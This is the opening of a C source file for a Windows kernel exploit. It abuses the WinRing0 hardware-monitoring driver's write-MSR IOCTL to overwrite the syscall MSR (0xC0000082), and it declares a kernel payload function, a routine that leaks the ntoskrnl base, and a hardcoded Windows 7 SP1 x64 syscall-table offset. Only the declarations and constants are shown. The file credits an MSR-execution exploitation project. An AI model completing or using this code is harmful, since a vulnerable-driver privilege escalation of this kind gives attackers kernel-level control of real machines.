#include <Windows.h>
#include <stdio.h>
#include "intrinsics.h"

// Credits:
// https://github.com/LibreHardwareMonitor/LibreHardwareMonitor/blob/master/WinRing0/OlsIoctl.h
// https://git.back.engineering/_xeroxz/msrexec/src/branch/master/vdm.hpp

#define TARGET_DEVICE "\\\\.\\GLOBALROOT\\Device\\\WinRing0_1_2_0"

#define SYSTEM_SERVICE_CALL_TABLE_OFFSET_WIN7SP1X64 0xA1580

#define SYSCALL_MSR 0xC0000082
#define OLS_TYPE 40000
#define IOCTL_WRITE_MSR CTL_CODE(OLS_TYPE, 0x822, METHOD_BUFFERED, FILE_ANY_ACCESS)

int main(int argc, char** argv);
void kernel_payload();

unsigned long long leak_ntoskrnl_base_address();

typedef struct  _WRITEMSR_INPUT_STRUCTURE {
	unsigned long Register;
	void* Address;
} WRITEMSR_INPUT_STRUCTURE, * PWRITEMSR_INPUT_STRUCTURE;